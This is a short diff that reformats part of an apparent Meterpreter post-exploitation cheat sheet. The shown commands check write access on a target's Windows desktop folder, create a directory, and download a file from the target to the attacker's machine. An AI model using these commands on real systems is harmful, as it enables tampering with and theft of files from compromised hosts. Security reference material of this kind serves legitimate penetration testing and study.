@@ -29,14 +29,14 @@
 
 - **check if file its writeable**
 
-client.fs.file.writeable?("C:\\Users\\pedro\\Desktop")
+      client.fs.file.writeable?("C:\\Users\\pedro\\Desktop")
 
 - **make a directory named "oldman"**
 
       client.fs.dir.mkdir("c:\\oldman")
 
 - **Download file from target system**<br />
-This will download dum.txt from taget and save it to attackers root directory
+'This will download dum.txt from taget and save it to attackers root directory'
 
       client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
 
